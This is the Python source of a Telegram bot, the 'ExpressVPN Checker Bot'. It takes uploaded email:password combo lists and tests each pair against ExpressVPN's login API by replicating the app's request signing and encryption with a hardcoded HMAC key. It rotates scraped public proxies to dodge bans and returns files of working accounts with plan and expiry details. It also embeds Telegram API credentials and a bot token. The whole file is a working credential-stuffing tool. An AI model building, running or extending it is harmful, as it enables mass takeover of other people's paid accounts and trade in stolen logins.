import os, sys, time, random, re, string, base64, gzip, json, hashlib, threading
import asyncio, aiohttp, requests
from datetime import datetime
from collections import deque
import concurrent.futures
from pathlib import Path

from pyrogram import Client, filters
from pyrogram.types import Document
from pyrogram.errors import MessageNotModified

import hmac as _hmaclib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.padding import PKCS7 as CryptoPKCS7
from cryptography import x509 as crypto_x509
from asn1crypto import cms, core, x509 as asn1_x509

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- BOT CONFIG ---
API_ID = 25131184
API_HASH = "33a9391cdc79df295c4e326440e58a8c"
BOT_TOKEN = "8571867917:AAGZFmENDhdL81xCsuAg27LTsKVoQ4q7GFM"

app = Client("express_checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --- CHECKER CONSTANTS ---
_BASE_URL    = "https://www.expressapisv2.net/apis/v2"
_LICENSE_URL = "https://www.expressvpn.com/api/v2/subscriptions"
_CLIENT_VER  = "11.5.2"
_OS_NAME     = "ios"
_OS_VER      = "14.4"
_UA          = f"xvclient/v21.21.0 ({_OS_NAME}; {_OS_VER}) ui/{_CLIENT_VER}"
_SIG_VER     = "2"
_SIG_ID      = "91c776e"
_HMAC_KEY    = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
_CERT_B64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMw"
    "EQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcN"
    "MTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29t"
    "ZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0B"
    "AQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0"
    "u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88Po"
    "cBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxe"
    "DjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86Ef"
    "nKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAd"
    "BgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/"
    "v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxX"
    "ARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iX"
    "JpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8k"
    "rF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp"
    "+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNz"
    "OuxZ4BXLe7YA=="
)

# --- CRYPTO LOGIC ---
def _aes_dec(data: bytes, key: bytes, iv: bytes) -> bytes:
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    raw = dec.update(data) + dec.finalize()
    up  = CryptoPKCS7(128).unpadder()
    return up.update(raw) + up.finalize()

def _aes_enc(data: bytes, key: bytes, iv: bytes) -> bytes:
    pad = CryptoPKCS7(128).padder()
    p   = pad.update(data) + pad.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return enc.update(p) + enc.finalize()

def _hmac(data: bytes) -> str:
    return base64.b64encode(_hmaclib.new(_HMAC_KEY.encode(), data, hashlib.sha1).digest()).decode()

def _sig(raw: str)   -> str: return f"{_SIG_VER} {_hmac(raw.encode())} {_SIG_ID}"
def _bsig(b: bytes)  -> str: return f"{_SIG_VER} {_hmac(b)} {_SIG_ID}"

def _cms_encrypt(data: bytes) -> bytes:
    cert_der = base64.b64decode(_CERT_B64)
    aes_key  = os.urandom(16)
    iv       = os.urandom(16)
    enc_body = _aes_enc(data, aes_key, iv)
    ccert    = crypto_x509.load_der_x509_certificate(cert_der)
    enc_key  = ccert.public_key().encrypt(aes_key, asym_padding.PKCS1v15())
    acert    = asn1_x509.Certificate.load(cert_der)
    recip    = cms.RecipientInfo({
        "ktri": cms.KeyTransRecipientInfo({
            "version": cms.CMSVersion(0),
            "rid": cms.RecipientIdentifier({"issuer_and_serial_number": cms.IssuerAndSerialNumber({"issuer": acert["tbs_certificate"]["issuer"], "serial_number": acert["tbs_certificate"]["serial_number"]})}),
            "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({"algorithm": "1.2.840.113549.1.1.1", "parameters": core.Null()}),
            "encrypted_key": enc_key,
        })
    })
    env = cms.EnvelopedData({
        "version": cms.CMSVersion(0),
        "recipient_infos": cms.RecipientInfos([recip]),
        "encrypted_content_info": cms.EncryptedContentInfo({
            "content_type": "1.2.840.113549.1.7.1",
            "content_encryption_algorithm": cms.EncryptionAlgorithm({"algorithm": "2.16.840.1.101.3.4.1.2", "parameters": core.OctetString(iv)}),
            "encrypted_content": enc_body,
        }),
    })
    return cms.ContentInfo({"content_type": "1.2.840.113549.1.7.3", "content": env}).dump()

# --- PROXY LOGIC ---
async def scrape_proxies():
    srcs = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ]
    pat  = re.compile(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})\b")
    seen = set()
    async def _fetch(url):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                    return pat.findall(await r.text())
        except: return []
    results = await asyncio.gather(*[_fetch(u) for u in srcs])
    for batch in results: seen.update(batch)
    return list(seen)

async def validate_proxies(raw, update_msg=None):
    sample = random.sample(raw, min(400, len(raw)))
    good = []
    sem = asyncio.Semaphore(80)
    async def _test(p):
        proxy = f"http://{p}"
        try:
            async with sem:
                async with aiohttp.ClientSession() as s:
                    async with s.get("http://httpbin.org/ip", proxy=proxy, timeout=aiohttp.ClientTimeout(total=5)) as r:
                        if r.status == 200: good.append(proxy)
        except: pass
    await asyncio.gather(*[_test(p) for p in sample])
    return good

# --- CORE CHECKER ---
def check_expressvpn(email, password, proxy=None):
    r = {"status": "ERROR", "email": email, "password": password}
    try:
        iv_b, key_b = os.urandom(16), os.urandom(16)
        iid = "".join(random.choices(string.ascii_lowercase + string.digits, k=64))
        body_j = json.dumps({"email": email, "iv": base64.b64encode(iv_b).decode(), "key": base64.b64encode(key_b).decode(), "password": password})
        enc = _cms_encrypt(gzip.compress(body_j.encode(), compresslevel=9))
        qs = f"client_version={_CLIENT_VER}&installation_id={iid}&os_name={_OS_NAME}&os_version={_OS_VER}"
        proxies = {"http": proxy, "https": proxy} if proxy else None

        sess = requests.Session()
        resp = sess.post(
            f"{_BASE_URL}/credentials?{qs}", data=enc,
            headers={"User-Agent": _UA, "Content-Type": "application/octet-stream", "X-Body-Compression": "gzip", "X-Signature": _sig(f"POST /apis/v2/credentials?{qs}"), "X-Body-Signature": _bsig(enc), "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"},
            proxies=proxies, timeout=15, verify=False,
        )

        if resp.status_code in (400, 401): r["status"] = "BAD"; return r
        if resp.status_code == 500: r["status"] = "BAN"; return r
        if resp.status_code != 200: r["status"] = "ERROR"; return r

        body = _aes_dec(resp.content, key_b, iv_b).decode("utf-8", errors="ignore")
        tok_m = re.search(r'"access_token":"([^"]+)"', body)
        if not tok_m: r["status"] = "BAD"; return r
        token = tok_m.group(1)
        
        sub_qs = f"access_token={token}&client_version={_CLIENT_VER}&installation_id={iid}&os_name={_OS_NAME}&os_version={_OS_VER}&reason=activation_with_email"
        batch_str = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"{_sig(f"GET /apis/v2/subscription?{sub_qs}")}"}},"method":"GET","url":"/apis/v2/subscription?{sub_qs}"}}]'
        
        br = sess.post(
            f"{_BASE_URL}/batch?{qs}", data=batch_str,
            headers={"User-Agent": _UA, "X-Body-Compression": "gzip", "X-Signature": _sig(f"POST /apis/v2/batch?{qs}"), "X-Body-Signature": _bsig(batch_str.encode()), "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"},
            proxies=proxies, timeout=15, verify=False,
        )
        
        ue = (br.text or "").encode().decode("unicode_escape", errors="replace")
        if "subscription" not in ue: r["status"] = "EXPIRED"; return r

        exp_m = re.search(r'expiration_time":(\d+)', ue)
        exp_ts = int(exp_m.group(1)) if exp_m else 0
        now = time.time()
        
        if exp_ts and exp_ts < now: r["status"] = "EXPIRED"; return r
        
        r.update({
            "status": "HIT", 
            "plan": (f"{m.group(1)} Month" if (m:=re.search(r'billing_cycle":(\d+)', ue)) else "Unknown"),
            "expire": datetime.fromtimestamp(exp_ts).strftime("%Y-%m-%d") if exp_ts else "Lifetime",
            "days": max(0, round((exp_ts - now) / 86400)) if exp_ts > now else "N/A"
        })
        return r
    except: return r

# --- BOT LOGIC ---
class JobState:
    def __init__(self, total):
        self.hits, self.expired, self.bad, self.errors, self.checked = 0, 0, 0, 0, 0
        self.total = total
        self.start_time = time.time()
        self.feed = deque(maxlen=7)
        self.lock = asyncio.Lock()
        self.proxies = []
        self.px_idx = 0

    def get_proxy(self):
        if not self.proxies: return None
        p = self.proxies[self.px_idx % len(self.proxies)]
        self.px_idx += 1
        return p

@app.on_message(filters.command("start"))
async def start_cmd(c, m):
    await m.reply_text("🚀 **ExpressVPN Checker Bot**\n\n📌 Send me a `.txt` file containing your `email:password` combos to start checking.")

@app.on_message(filters.document)
async def handle_document(c, m):
    if not m.document.file_name.endswith(".txt"):
        return await m.reply_text("❌ Please send a `.txt` file containing combos.")

    status_msg = await m.reply_text("⏳ **Initializing Task...**\nDownloading your combo list...")
    file_path = await m.download()
    
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        combos = [line.strip() for line in f if ":" in line.strip()]
    os.remove(file_path)

    if not combos: return await status_msg.edit_text("❌ No valid combos found in the file.")
    
    await status_msg.edit_text("🌍 **Scraping & Validating Proxies...**\nThis might take ~15 seconds...")
    raw_px = await scrape_proxies()
    good_px = await validate_proxies(raw_px)
    
    state = JobState(len(combos))
    state.proxies = good_px
    
    # Files
    job_id = int(time.time())
    hits_file, exp_file = f"hits_{job_id}.txt", f"expired_{job_id}.txt"
    open(hits_file, "w").close()
    open(exp_file, "w").close()

    def generate_dashboard():
        elapsed = int(time.time() - state.start_time)
        cpm = int(state.checked / (elapsed / 60)) if elapsed > 0 else 0
        pct = state.checked / state.total if state.total else 0
        filled = int(pct * 20)
        bar = "█" * filled + "░" * (20 - filled)
        
        dash = (
            "⚡️ **BEE EXPRESS CHECKER** ⚡️\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 **Total:** `{state.total}` | 🔄 **Checked:** `{state.checked}`\n"
            f"✅ **Hits:** `{state.hits}` | ⚠️ **Expired:** `{state.expired}`\n"
            f"❌ **Bad:** `{state.bad}` | 🔴 **Errors:** `{state.errors}`\n"
            f"⏱ **CPM:** `{cpm}` | ⏳ **Elapsed:** `{elapsed}s`\n"
            f"🛡 **Proxies:** `{len(state.proxies)}` Auto-scraped\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"[{bar}] **{pct*100:.1f}%**\n\n"
            "📡 **Live Feed:**\n"
        )
        for line in reversed(state.feed): dash += f"{line}\n"
        return dash

    is_running = True
    async def update_dashboard():
        while is_running:
            await asyncio.sleep(4)
            try: await status_msg.edit_text(generate_dashboard())
            except MessageNotModified: pass
            except: pass

    dash_task = asyncio.create_task(update_dashboard())
    sem = asyncio.Semaphore(15)

    async def worker(combo):
        email, pw = combo.split(":", 1)
        for attempt in range(3):
            proxy = state.get_proxy()
            try:
                async with sem:
                    res = await asyncio.to_thread(check_expressvpn, email, pw, proxy)
            except:
                if attempt == 2:
                    async with state.lock: state.errors += 1; state.checked += 1
                await asyncio.sleep(1)
                continue

            status = res.get("status")
            if status == "BAN" or (status == "ERROR" and attempt < 2):
                await asyncio.sleep(2)
                continue

            async with state.lock:
                state.checked += 1
                if status == "HIT":
                    state.hits += 1
                    state.feed.append(f"✅ `HIT` | `{email[:15]}...` | {res.get('plan')} | {res.get('days')}d")
                    with open(hits_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{pw} | Plan: {res.get('plan')} | Exp: {res.get('expire')} | Days: {res.get('days')}\n")
                elif status == "EXPIRED":
                    state.expired += 1
                    state.feed.append(f"⚠️ `EXP` | `{email[:15]}...`")
                    with open(exp_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{pw}\n")
                elif status == "BAD":
                    state.bad += 1
                    state.feed.append(f"❌ `BAD` | `{email[:15]}...`")
                else:
                    state.errors += 1
            return

    await asyncio.gather(*[worker(c) for c in combos])
    is_running = False
    dash_task.cancel()
    
    try: await status_msg.edit_text(generate_dashboard() + "\n\n🎉 **CHECKING COMPLETED!**")
    except: pass

    if state.hits > 0: await m.reply_document(hits_file, caption=f"✅ {state.hits} Hits Found!")
    if state.expired > 0: await m.reply_document(exp_file, caption=f"⚠️ {state.expired} Expired Accounts")
    
    os.remove(hits_file)
    os.remove(exp_file)

if __name__ == "__main__":
    print("🚀 ExpressVPN Checker Bot is Running...")
    app.run()
